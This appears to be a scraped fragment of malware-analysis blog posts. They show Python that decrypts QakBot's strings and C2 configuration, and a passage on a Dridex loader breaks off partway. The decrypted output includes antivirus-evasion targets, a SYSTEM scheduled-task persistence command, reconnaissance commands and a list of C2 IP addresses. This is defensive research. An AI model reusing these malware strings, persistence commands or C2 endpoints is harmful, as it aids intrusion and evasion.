6049585723cebb7e4e44eb4ae6b4048719ea69d1f5910cb0cc0e1e983b541cc3663c52744f256f48e24806adb2c1b739057bab0ccd253f5e6d704741f8bbedd124f32ab96e0456e8514d58ac23ee952fdee252d35fd77a2e6bca95bade134449897f1a745fbad4f43627d81e380565852c234e1eed38aa244af3a64812455fb508bb82e826adb2c6d65de1bd38a898007b3f5d90c363fa696e73f4821a2b9e04661ce2fd081df34bc6cedf133797da829f1e2e3f20bc6dd5b75d9a2e4ad42b5ee694c57779fefd04b5f1dcf77dbcdd482a845890363991155f85b89b22f8167926224529d46bce8a59600c7f5d4050733b781e1330216abb3e2486cc00ddc82d55b9a65eff725605ab23ff395c8ce3ee2e40f1692f2d6966296e26c47507dbbefd24a4522d334e9ddd992c712f62c759f0751c55aca8f64ae408a7d1f59ab04ed98819711c0edd60a7a39ba9682214728a3beec5d25c12fd1eff334a471fded244161b33587c6dec737e4f37b1c9894c28b60fb9544471726b2c9d05a4413d532e3cfe99fb443c038069c0b52e441c4cb1d9676956f3d7a88328b8ba3ac2ff0ddf53f665c8192f2224729a4d0da664df114fcbdf5078475fff12f7e67bb24dbc2f2e516c8d02816fcb7f6a143bfa75f75776494c8c54b363cf50edeede8c88376f155458a1248fe5acbd7059760907c2166885bb6aac0bc16c5fddb0c1d18eebee3385b20abb3fd5c79c03191a1d136ac30cccd10496dab39e4f0d2cf5ef4c22940d1b1f5e87eafa3595c571483f2c4535a5cc537e1a8eeb49272a50647bd2358fa5ccba82480659a6d2d38994abcffbf9905e0f1ca1f3d3fa7dde72e4b46e4b5f14c0bcc2edc88d574a36cf9e4407a65b433a7e5e9e411c2d42816dbb3fca80db8b048485071cda1c5474613cf3fad8a9fb5e517877055c945369751cc88319e728a40297b9932f9a29e971e9394cd1a312ea79df4784a2aa6d0fc5b67c82cd3c1d437a51cd5ed297961bc3ceeeff2e51587c33a42d9b0f1b748f5ec03294777bef0c37745068f3ef5cdbac3944ed62163863053f84180a7128b60876b2525ce6e96aa89bc01dae2dd3a3128b783ac335623ca92f05d6ee326d38cd575ac64f983176466ee62d8c5e9e416d2c42f36ef81f3b644abb6037a487188f6801a4378f23ef988d584ad60e81c558e104afe56c0db7cd254967a07749657bab0c4da04dafad50e3928b1c9a0760866e8abe0447bc031ce80de3abd75f3ed0c687eb83cbafcf6fb17d5d43458d9a6f5b90c879e0375017782e9d463551bcc2dbf8a93ec9452d1756989086ce55ac69e328133ce2e0f73887dbbae899b079bb6cf003a31a59ef6251434a5bffd7568cc2ecbdd8a0ca072afb11f5d7ab233e2e6e8a95badc22944eab7e4b15fb5e210094b7687d6d2505517d228a3ebc883a643c07d24ce111ebb15cb8e2d9e3fd3603d7ad012b7b180d179e4c7fb1b3d2cb6ddd13a4b23baf0bb193b9549ee8ac47baf6ff3a37d2d4baf35e6e1fec410cdc2384290f0c3a75fb2b259404a73c3c0c9535321d828f9cdd7a9a55dc03672c94b36f146cad505977f967a2d50955ebceccedd0091bdb800393da596ad314720cab1eb4a6fc025da87d931a270f1ed2f7d79af23f3e0edfc0adedd5b44d7bde4987ebea1585b4d6094c5c5514217d3698d8de99fb443c03854840d48b269f68232a55ca4387c4a9141aba5c29d0bd694e41a326eec97ee3a2e27abb2ea4d6ec025da87d932a377f0ee2e6267ad21f5e6effe07d1d0234fc1a8909344b5f11f76667d82f5a01a452ed222fedcdf8bf405f95575830750fb0697d5259e7ff3&#39;) # Create string table function def print_strings_table(strings_key, strings_data): strings_out = [] for i in range(len(data)): strings_out.append(strings_key[i%90] ^ strings_data[i]) strings_table = bytes(strings_out).decode(&#39;latin1&#39;) # Print strings table for s in strings_table.split(&#39; x00&#39;): print(s) print_strings_table(key, data) # Create string lookup function def string_lookup(strings_key, strings_data, offset): strings_out = [] for i in range(len(data)): strings_out.append(strings_key[i%len(key)] ^ strings_data[i]) strings_table = bytes(strings_out)[offset:].decode(&#39;latin1&#39;) return strings_table.split(&quot; x00&quot;)[0] print(&quot; n nString lookup(%d): %s&quot; % (0, string_lookup(key, data, 0))) . coreServiceShell.exe;PccNTMon.exe;NTRTScan.exe MBAMService.exe;mbamgui.exe %SystemRoot% SysWOW64 explorer.exe MsMpEng.exe SOFTWARE Microsoft Microsoft Antimalware Exclusions Paths WBJ_IGNORE mpr.dll LocalLow bdagent.exe;vsserv.exe;vsservppl.exe avp.exe;kavtray.exe C: INTERNAL __empty cmd.exe SOFTWARE Wow6432Node Microsoft Windows Defender Spynet . pipe {%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X} wbj.go .cfg Packages iphlpapi.dll image/pjpeg %SystemRoot% SysWOW64 OneDriveSetup.exe Win32_PnPEntity user32.dll %SystemRoot% System32 msra.exe WRSA.exe vbs cscript.exe egui.exe;ekrn.exe FALSE .dll tcpdump.exe;windump.exe;ethereal.exe;wireshark.exe;ettercap.exe;rtsniff.exe;packetcapture.exe;capturenet.exe crypt32.dll ALLUSERSPROFILE shlwapi.dll setupapi.dll vkise.exe;isesrv.exe;cmdagent.exe 1234567890 avgcsrvx.exe;avgsvcx.exe;avgcsrva.exe open t=%s time=[%02d:%02d:%02d-%02d/%02d/%d] SubmitSamplesConsent Winsta0 Create %SystemRoot% SysWOW64 explorer.exe %S.%06d */* mcshield.exe application/x-shockwave-flash SOFTWARE Wow6432Node Microsoft AntiMalware SpyNet ws2_32.dll %SystemRoot% SysWOW64 xwizard.exe reg.exe ADD &#34;HKLM %s&#34; /f /t %s /v &#34;%s&#34; /d &#34;%s&#34; snxhk_border_mywnd Set objWMIService = GetObject(&#34;winmgmts:&#34; &amp; &#34;{impersonationLevel=impersonate}! . %coot cimv2&#34;) Set objProcess = GetObject(&#34;winmgmts:root cimv2:Win32_Process&#34;) errReturn = objProcess.Create(&#34;%s&#34;, null, nul, nul) wpcap.dll select Win32_ComputerSystem SysWOW64 fmon.exe AvastSvc.exe kernel32.dll %SystemRoot% System32 mobsync.exe netapi32.dll Content-Type: application/x-www-form-urlencoded %ProgramFiles(x86)% Internet Explorer iexplore.exe advapi32.dll SOFTWARE Microsoft Windows Defender Exclusions Paths c: %SystemRoot% explorer.exe aswhookx.dll %SystemRoot% explorer.exe https Software Microsoft %ProgramFiles% Internet Explorer iexplore.exe System32 dwengine.exe;dwarkdaemon.exe;dwwatcher.exe Win32_PhysicalMemory type=0x%04X %SystemRoot% System32 xwizard.exe wtsapi32.dll .dat aswhooka.dll LastBootUpTime SELECT * FROM Win32_Processor Mozilla/5.0 (Windows NT 6.1; rv:77.0) Gecko/20100101 Firefox/77.0 Win32_Process Win32_DiskDrive Name fshoster32.exe SpyNetReporting S:(ML;;NW;;;LW) WQL c: hiberfil.sysss SOFTWARE Microsoft Microsoft AntiMalware SpyNet Set objWMIService = GetObject(&#34;winmgmts:&#34; &amp; &#34;{impersonationLevel=impersonate}! . %coot cimv2&#34;) Set colFiles = objWMIService.ExecQuery(&#34;Select * From CIM_DataFile Where Name = &#39;%s&#39;&#34;) For Each objFile in colFiles objFile.Copy(&#34;%s&#34;) Next aaebcdeeifghiiojklmnooupqrstuuyvwxyyaz Caption,Description,Vendor,Version,InstallDate,InstallSource,PackageName SystemRoot SELECT * FROM AntiVirusProduct %SystemRoot% SysWOW64 mobsync.exe wininet.dll CommandLine SELECT * FROM Win32_OperatingSystem winsta0 default ROOT CIMV2 Caption SOFTWARE Microsoft Windows Defender SpyNet NTUSER.DAT Caption,Description,DeviceID,Manufacturer,Name,PNPDeviceID,Service,Status ntdll.dll TRUE SAVAdminService.exe;SavService.exe .exe image/jpeg wmic process call create &#39;expand &#34;%S&#34; &#34;%S&#34;&#39; displayName from userenv.dll urlmon.dll Initializing database... ccSvcHst.exe %SystemRoot% System32 OneDriveSetup.exe ByteFence.exe Win32_Product WScript.Sleep %u Set objWMIService = GetObject(&#34;winmgmts:&#34; &amp; &#34;{impersonationLevel=impersonate}! . %coot cimv2&#34;) Set objProcess = GetObject(&#34;winmgmts:root cimv2:Win32_Process&#34;) errReturn = objProcess.Create(&#34;%s&#34;, null, nul, nul) WSCript.Sleep 2000 Set fso = CreateObject(&#34;Scripting.FileSystemObject&#34;) fso.DeleteFile(&#34;%s&#34;) image/gif abcdefghijklmnopqrstuvwxyz root SecurityCenter2 %SystemRoot% SysWOW64 msra.exe sf2.dll aabcdeefghiijklmnoopqrstuuvwxyyz Win32_Bios %s system32 shell32.dll String lookup(0): coreServiceShell.exe;PccNTMon.exe;NTRTScan.exe . key = unhex(&#39;09bcba05a9423e4ad9256dea6dd6916dbfd2d242e45801f25905afde20b6f88e34d60f78a26a952d8f646efba3467cc65e11720d1559bfc27de9a9b12b5644a2444f8cbb7423ee77544330eb389f0c8214f4b35399147d1dcda0&#39;) data = unhex(&#39;2ccf9a278d674d6ae40531c848a5cd4f84f2f462c07d72d05975c0a945c48be651ba6356c712f02dfc07068fc23517b570740a683576fcb01888ddd40b7916f7646dc2ef5462bb231c0c62a26cc650d14da7e716d4365d329ee329f3f456fd036c1ef90a39a44df3e44d90868062c67d72d0792ae18e0099be8e67b3631e821ef05efb4428baea0a39827f30530d452bd0a50f88c4f54a2225a20926efc91b5081112043478357fe61eb34dbd23ff5142f78a98041ddce25ff2b4c3e906a56bb289bc46dd1b7a662883762933562ddb155c6f8dd7b905b2fe338d071c20d0d89cc3513a02a4d25647b3dd0b50ec9e7e5771531d0362ae2cf22469c043d2c5eb768ed63e47d98d61ff067091da8d27bd3c825db274d77fe001ecd4db3e31f82f7b662883d6fcf7c70af8d45da9eae40b37c0c8225de038f051c8b836b1dc67c3401516620ccb618849a83772527ca302effd0070d8b0f316110c47bed69e36091937ccb415d3f83f429fdef51e10d6c038d7c31b93485c528f2f0f26d903621d72a2580aa5296daab47f42f57f129b562c1272bdb8c1c5ce90d455228256bcaf858d99bc40b7901f6646abc890119cb47663630985bf778e3679fc07dfc6c183de2e46cd0df71cc62110cf90a39a44df3e46dcca0a4328b2b75dc3c7dcae546c491ea55fb7811cc00f04efb0b1cd6cb2310b63b635f3e2777daba18d2cfc34232258f3326e2d111409a18266e588e54ef69f039c2877dfc6c181dbfcf7cc8df25d9305724ad25039901b9fe06caa2f26f952d64802071d6ae458bb9c278f6220ccb07f042fa1053ca936623aa3a7002234a2ddcb2538dca9f743b37c6273ca29e0723801b2026439f18b068ed7995da3dc6600f68bed47a9c9564c52e613eab501e9e1ed6a4558ee0d271d36938f27769c1b520d89dfa47a26e0c8247fb4ce0640dc1ff160ea9396313605138cba37d88dd9f4e2e2182613ab69e0103cc52276110c4719f50d16d87c736f4274f419ac967d8d572da12513dbc573e8208bafd31c9e3fc72b8286e853c77dcb645da94a051ae6a78c307e659fd010f968d2210aa5e7f1779352fd6a70ac986d0473a44d33326e2c80042ee52276315db0ce722a761d49663ad6c5338b8807bd9c93f89674d6aaa4005b519b3e21985f2f737c43b6e9c2a71dc8154d38bfa0ef62a1c821cf849ea100b98d72318fc7e34162d762bdaa3098cd9c3443521d13775ac9e10238d1a30631f8818ec69f614d49c30b9641473aa8e6cc4df25842c1e7cf9145fdd43e6bf5d91e3f264c478758b29608ffc05c5a4dd4da57b1dcf59a771ec0502988d2304a37c314c2d377ccce07db5fac8582221cf777dd0ec1d4d8a18233060844ffa7ed17c91df3fc5624c33fdfc79d3cd60db31562fb549438f15b3913ef0948615a50a44ae146cccac4fc597e8408a5811cc0efa5afc382d8ed13419a82a47177f6630d0ac21bbdcdf2b3c0cda253cf8ff17479d5e3b0e53d652e964b56390e63be1770e79b99209ddc871c0245f29ad0b089208edfc01c8a08d3189286dc92a64c2ae4cd3c3fd55b86b1acd12ae4efa070594cc6b47b03763077e150fd6b0099cc8dd2b0636cd2226e0de3d4e8f103113519f509f5acb46a0e612d5392d5ecdc979dfd56bcf2b596af64401866db8f4199fa1ba23963d01b36a4099ea6583cdd144a4342ee005ed7be6000b94a3630fe602335628667982e221b5f5930e2518fe1813b79b5203ca52271f12eb17eb38826691d420ef664e2fe3c571d99a28da623e&#39;) print_strings_table(key, data) #print(&quot; n nString lookup(%d): %s&quot; % (1246, string_lookup(key, data, 1246))) string_lookup(key, data, 708) . %s &#34;$%s = &#34;%s &#34;; &amp; $%s&#34; powershell.exe schtasks.exe /Create /RU &#34;NT AUTHORITY SYSTEM&#34; /SC ONSTART /TN %u /TR &#34;%s&#34; /NP /F Self test FAILED!!! ProgramData Microsoft whoami /all Red Hat VirtIO;QEMU net localgroup SOFTWARE Microsoft Windows NT CurrentVersion ProfileList error res=&#39;%s&#39; err=%d len=%u Self test OK. arp -a &#34;%s system32 schtasks.exe&#34; /Create /RU &#34;NT AUTHORITY SYSTEM&#34; /tn %s /tr &#34;%s&#34; /SC ONCE /Z /ST %02u:%02u /ET %02u:%02u schtasks.exe /Delete /F /TN %u srvpost.exe;frida-winjector-helper-32.exe;frida-winjector-helper-64.exe route print nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.%s nltest /domain_trusts /all_trusts 5812 3719 .lnk netstat -nao c: ProgramData at.exe %u:%u &#34;%s&#34; /I System32 WindowsPowerShell v1.0 powershell.exe amstream.dll net view /all qwinsta %s %04x.%u %04x.%u res: %s seh_test: %u consts_test: %d vmdetected: %d createprocess: %d cmd /c set /c ping.exe -n 6 127.0.0.1 &amp; type &#34;%s System32 calc.exe&#34; &gt; &#34;%s&#34; System32 WindowsPowerShell v1.0 powershell.exe SOFTWARE Microsoft Windows CurrentVersion Run jHxastDcds)oMc=jvh7wdUhxcsdt2 artifact.exe;mlwr_smpl;sample;sandbox;cuckoo-;virus Virtual ProfileImagePath VIRTUAL-PC ipconfig /all net share A3E64E55_pr;VBoxVideo %s &#34;$%s = &#34;%s ; &amp; $%s &#34; /t4 regsvr32.exe -s . &#39; System32 WindowsPowerShell v1.0 powershell.exe&#39; . Decrypt RSA Public Key . key = unhex(&#39;60441b6a08752e227c50334a08122d395a&#39;) data = unhex(&#39;50c61a483878282b56d67bccff1f2c3861411b698a7421224cd232400a902c386087aa879d75c99ad8e04da00fecffa6838a0df6c32da3251b749690f07c6d027e3a0b5f1e1ac2522a396702b35bc678b0defb6a2b21e8a69b668a06c48612b593c4495f476d5697d5719c35b7125a4a25b62a44244188381473f8acca2a414c20b49e16dc57378d2f742b77aa0b059c2582068062d5bdb42bf959b0fc89fe6cdddb9965248ecda9ea64103bbfc6b53d14bbee029a68e7f382bcc1ab20a4d6d776359d0b6a1b4fdb71ec45093199a066c70119e1cac7164bbb41af1a35b076b667022298addc67a9e71ca25e9e7eca2c592d1ec28a501394b7a36fde1ed22e5746fe08172aa6ef0685c5d59c98b0658f1f4cb9a5506f0d5c31177379f91569473f46186b08740000&#39;) out = [] for i in range(len(data)): out.append(key[i % len(key)] ^ data[i]) tohex(bytes(out)) . b&#39;30820122300d06092a864886f70d01013b215f72e07c540c6eae627340983e1559ddcac3861fc1eff6c231f03ca6f7b4aeb357968736c92d6e5ab4eca04f270a6c1732057e5ed938224c4920cf0bf532b8ccd6537141acbdf16eff28e6fa4286d9cc5b727e3736d3ce1b94409930261a16fc22560978d258506892a4bf0463307087d41ece7a0ed74f30301da27e2bbe59d235ca6ac7908d71991dab96818b42ffa7c9566e86df84d33e707fa4acbd483a999252a922efe1af859bcb64bfbcdf031bbf773a2805d363c17c5351ddbb0ccf7437c3b6972501b35382236fd032ad0d0a57b68fa0379aad14b073a724aa68424716b7a4726fc484e967cc33eb743702e5621f5f88cd7ad5f69f948a9d5cd57f08a2cf581a237e4d474033f107447e65265c70627c752e&#39; . RC4 Decryption . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . Config Extraction . import pefile import hashlib import struct SAMPLE_FILE_PATH = &#39;/tmp/qakbot.bin&#39; data = open(SAMPLE_FILE_PATH, &#39;rb&#39;).read() pe = pefile.PE(data=data) # Get the encrypted config from resource rt_string_idx = [ entry.id for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries ].index(pefile.RESOURCE_TYPE[&#39;RT_RCDATA&#39;]) rt_string_directory = pe.DIRECTORY_ENTRY_RESOURCE.entries[rt_string_idx] resource_data = None # The resource name is hardcoded -- needs to be dynamic for entry in rt_string_directory.directory.entries: if str(entry.name) == &#39;3719&#39;: data_rva = entry.directory.entries[0].data.struct.OffsetToData size = entry.directory.entries[0].data.struct.Size resource_data = pe.get_memory_mapped_image()[data_rva:data_rva+size] # Build decryption key -- change to dynamic extraction key_string = rb&#39; System32 WindowsPowerShell v1.0 powershell.exe&#39; m = hashlib.sha1() m.update(key_string) key_bytes = m.digest() out = rc4crypt(resource_data, key_bytes) # Config has a SHA1 intergrity check followed by binary ip addresses print(&quot;Config SHA1: %s&quot; % tohex(out[:20])) ip_table = out[21:] for ptr in range(0,len(ip_table),7): ip_string = &quot;%d.%d.%d.%d&quot; % (ord(ip_table[ptr:ptr+1]), ord(ip_table[ptr+1:ptr+2]), ord(ip_table[ptr+2:ptr+3]), ord(ip_table[ptr+3:ptr+4])) port_string = struct.unpack(&#39;&gt;H&#39;, ip_table[ptr+4:ptr+6])[0] print(&quot;%s:%s&quot; % (ip_string,port_string)) . Config SHA1: b&#39;ffe5a5fda14380c41fe6fcf4b5c0032ba5e22efe&#39; 32.221.229.7:443 140.82.49.12:443 24.152.219.253:995 182.56.99.126:443 76.169.147.192:32103 218.101.110.3:995 89.101.97.139:443 82.152.39.39:443 176.24.150.197:443 96.37.113.36:993 68.186.192.69:443 59.88.168.108:443 75.110.250.187:443 182.191.92.203:995 89.165.88.95:443 103.142.10.177:443 45.9.20.200:2211 24.95.61.62:443 194.36.28.26:443 78.101.82.198:2222 37.211.157.100:61202 70.163.1.219:443 31.215.99.73:443 103.143.8.71:6881 59.6.7.83:61200 63.153.187.104:443 14.96.79.22:61202 93.48.80.198:995 24.53.49.240:443 94.200.181.154:995 149.135.101.20:443 24.178.196.158:2222 209.210.95.228:32100 78.101.82.198:443 67.209.195.198:443 96.80.109.57:995 80.14.196.176:2222 38.70.253.226:2222 24.222.20.254:443 217.165.123.47:61200 74.15.2.252:2222 217.128.93.27:2222 102.65.38.67:443 190.73.3.148:2222 79.167.192.206:995 95.5.133.68:995 114.79.148.170:443 120.150.218.241:995 186.64.87.213:443 65.100.174.110:443 96.21.251.127:2222 136.232.34.70:443 63.143.92.99:995 65.100.174.110:443 136.143.11.232:443 39.49.27.10:995 111.125.245.116:995 41.228.22.180:443 217.164.247.241:2222 83.110.107.123:443 76.25.142.196:443 74.5.148.57:443 65.128.74.102:443 67.165.206.193:993 173.21.10.71:2222 71.74.12.34:443 94.60.254.81:443 23.233.146.92:443 73.151.236.31:443 79.160.207.214:443 213.120.26.24:443 89.137.52.44:443 75.188.35.168:443 109.12.111.14:443 106.51.48.170:50001 68.204.7.158:443 78.101.82.198:995 96.80.109.57:995 80.6.192.58:443 41.96.250.164:995 114.79.145.28:443 188.54.96.91:443 105.198.236.99:995 50.238.6.36:443 65.100.174.110:8443 70.51.134.181:2222 117.248.109.38:21 83.110.107.123:443 86.98.53.83:443 182.176.180.73:443 217.165.11.65:61200 103.143.8.71:995 50.237.134.22:995 187.189.86.168:443 100.1.119.41:443 2.178.67.97:61202 86.198.237.51:2222 88.253.171.236:995 73.171.4.177:443 40.134.247.125:995 72.252.201.34:995 190.39.205.165:443 187.172.146.123:443 92.167.4.71:2222 189.30.244.252:995 194.36.28.26:443 105.111.124.76:443 84.199.230.66:443 14.96.67.177:443 50.238.6.36:443 182.56.57.23:995 87.70.93.215:443 93.48.58.123:2222 73.5.119.219:443 75.169.58.229:32100 173.71.147.134:995 173.71.147.134:995 69.46.15.180:443 23.82.128.108:443 5.36.7.212:443 200.75.131.234:443 82.77.137.101:995 187.201.90.81:443 24.55.112.61:443 201.172.31.95:443 216.238.72.121:443 216.238.71.31:995 207.246.112.221:443 207.246.112.221:995 216.238.72.121:995 216.238.71.31:443 27.223.92.142:995 216.238.71.31:443 207.246.112.221:995 207.246.112.221:443 216.238.72.121:443 216.238.71.31:995 216.238.72.121:995 24.229.150.54:995 117.198.149.221:443 216.238.71.31:443 207.246.112.221:443 216.238.72.121:443 216.238.71.31:995 207.246.112.221:995 216.238.72.121:995 207.246.112.221:995 216.238.72.121:995 207.246.112.221:443 216.238.71.31:995 . TODO . add dynamic extraction for the decryption key | add dynamic extraction for the resource names | decrypt the other resource | fix ip extraction to use struct | validate the extract configs using the sha1 hash | .",
            "url": "https://research.openanalysis.net/qakbot/qbot/malware/config/2021/12/22/qakbot.html",
            "relUrl": "/qakbot/qbot/malware/config/2021/12/22/qakbot.html",
            "date": " ‚Ä¢ Dec 22, 2021"
        }
        
    
  
    
        ,"post68": {
            "title": "Dridex (DoppelDridex) Loader",
            "content": "Overview . Sample (unpacked): c7990f1e72fdfa84552f02f9d11cabb74251b0508291af5366fefcee646f9c91 . References: . UnpacMe Parent: 375167a16a6beeee52910d6424eb884c631ada9bcb9843809eecd0475718e549 | Malware Bazaar | Unpacked Sample (Malshare) | Appgate dridex ioc extraction (prior research) | API Resolving blog (Chuong Dong) | Nice extractor from CAPE | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Known Data (Config) From Joe Sandbox . { &quot;Version&quot;: 22201, &quot;C2 list&quot;: [ &quot;103.42.56.15:443&quot;, &quot;169.255.57.61:8116&quot;, &quot;128.199.192.135:6602&quot; ], &quot;RC4 keys&quot;: [ &quot;s6ptqqQ96C42ODZyFUv32gPAVtURlPXrif68ogKV96MSXkXTs&quot;, &quot;rZP9KOr8K1zzIudGa98GqFxsSgNXTDprMuKqtLAWjx1u1prqdOQuZjmv5&quot; ] } . RC4 Decryption . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Test Data Decrypt . data = unhex(&#39;991fd7128ac6c8165a9d2daf172ef27944fd14f1fcaed3ff7f8cc4e02e434d439ee2becd4f076605a7bb5e20a2f4a73fa6c59f94cd7729eaa202576c1d33f0fc725fcdccd2b1d4dfb60c11f8d68aa7cc7acd78f97a9f9d777508d3d53c9c5fe6c64bb834f97680548dc6f093328097283261926ff58e662476ec8689b0b136ce9d7a8aa27a884c559fd5a60358f54c150587b89b01d6a3abdb2ec419029df02ce69c9997821cb14c8b2a4bbd74b747921650b98c93b50db1e557aa258b31397fe4ae9fde0f042dc856a2ed2865ccc639820ae7e94042f5deaa9c2d41f6a3034a251d954642e76b48002a2479ad96dea13bb77e74b1c28fbf5c61da648def0b3e99eda2a396594e3f59b3bc5d22c39f7aacc792a4e3db0bacdc5623dc2a333b8de3f27f3075ad2fd2a118b903e1f1f5fed45bde3fc1df0047f05ab27f0617a690440bba697ced12a1003eba57e49b69d40b9e4cbaf640ea8f03a57d2dc3507377ac4732a2eac76a10fc562139b3cc3cf616641feaeae1d580a4092f9ba3dbb0296ac8c7669d5c3635e2b2de5e05c2b2090c470b842be348f8aa35cac0b5a216d089689d88cb4f84d4a399c31d6acdb1bc7f86094fade26c3070bda7a37ae3254f94170f6163e8bef596c9025975d67bdcd1bf35cfdbed3ce789785f6d3c71b0472514dd2672c496d0fff1f5609ad632120c243930e481732ec5791ef33d0e7de20f925dc21f7aeeaea6a08af88ba3ae57863209f07d860cc0a54910043566ad4bdb4287a0fccce20685ec03f350a2fd22d7aaffb17304b5b7466fe317f624d91f53bf8d4d96369c810c0beae24c9307d555963ef0b3fd90fa1e7c99475a4b2c19047b356ca0e1220be20ba501f6e9c7e93a7803066d570be2d9f246a07ac151ec78ed665ab3ca827e6d03fe941b1ccc6e0d1a146c03c5751fe38e12781d34c90bf7636f9e5e322af63ba2e4fe71f6a2dffc05db028d5e3ac27a9a823c3c4471063f41a12263dd6378d32b602b6900d2de732ff215390ac8392fc6309f521e6a35d419dd8eb6a3be617fb48fc1ccbe1d640736b8fec3065a66b119fb7bdbf192bd9efd25c806a5cbb47d2fbcf3f5d2bd6a30a36617cc19bea06730e85417d006a44d35072fdb24dcb358c94b898a2fa80ab797113b636af50350a20cfb54ce441b15d26e62745354c223d342654e534a929ff5140b8bcba469e24794d795065ba8734b84d2063ae762d112fe5415266bab8ae35d10d68df561631acca2e69e61704bc4ee498c1c276c56251d3c7e5314e043bc6281d644e5e38d9fad56cb3284f2d2819b42423bd914bb7e75e46f47fce8f6da23c451d244bb807a5ce4399158f036b9364f6a91022ccc34dea34a2c00a0003c3fb773061c060a426c1ecd5aadbcaaccbe0146057cde291bf5f2968a58bb8d2a3793aa0431b6a5b20357eef157c0ed2340925c6ec1eb083d1edb3fe4fe72c2b9660507dee987cd5b612c5bf1048149c609feb0b658766af44f6368c6fd8ab2be56c4b1b102006681ab2423d9b47b6cda3445f7209c3b61d20f1a5855296a0d8bdae82b44a16e202b266bbd244c7918298b5d27ae28c775ff8f9b03220a9ace2f4e10474ae6db402f4deca0c54553cfabc348f8a3c45cb960b1272fb9434d0168af93a8d0201671b224fdca05281873e7cb5b3bb96a52657ed4de823c65422b44e1302509a8267ca8dc868ae3014add43e25c862210bc54118ab89893aa53f8da4adc008081a5dd95b50db9322f93a90b3daa5d36ce09680e6aad0f2a1bfe79d0136bf99bdeb13572ea6ed03e85f5e124eae9aad92310129a195f1ee97045db33f0acae6f13e7d3c909b9746901116c91b6d594574ba33192d244b82bdd03dc9c8bd88b6515257a95f85314037a6dd12291b9982d05eb87c83defcc47344f0200c4d395ad6fd43dce7475f284bb82e71efbef5aa1d58ce5dad95c5d584997e24629a6879afe7d06b6191564c9ace2ad8db1f64d0a0a6d5df4e7d5bd2868ef48347662e3d8ab3e579962c2a161588fc8fdde43bdf32ff4132aceed418999a5db02d3a38bacbc18360a42bc4f5a0ee6f4ae6d21f824ec237f2e9ca10ada9d9966a6d87a07f9313f6701702f12dd5b8cd1cce1e7cdeeac49bdfa3be62f1ec03d41ab5b7c7914d7ad5723d0e7acd8d2cac1d6473114e6562d08b27b4575864d22ca749ff148dd3478952cb03b663655fcd40cc26c4b444bada92fbbc6bbae16fc56316252dca3bf230c6b24d693f6f285da&#39;) key = data[:48][::-1] data = data[48:] b64_data = rc4crypt(data, key) import base64 import struct 